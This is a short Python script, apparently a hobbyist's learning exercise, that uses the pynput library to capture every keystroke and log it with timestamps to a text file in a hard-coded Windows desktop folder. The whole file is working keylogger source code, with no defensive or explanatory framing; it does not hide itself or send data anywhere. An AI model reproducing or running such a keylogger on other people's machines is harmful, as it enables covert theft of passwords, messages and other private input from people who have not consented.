from pynput.keyboard import Key, Listener
import logging

# Specify the directory path where you want to save the log file
log_dir = "C:/Users/karol/OneDrive/Desktop/keylogging/"

# Configure logging to save keystrokes to keylogs.txt in the specified directory
logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to be called when a key is pressed
def on_press(key):
    logging.info(str(key))

# Create a listener instance to monitor keypress events
with Listener(on_press=on_press) as listener:
    listener.join()
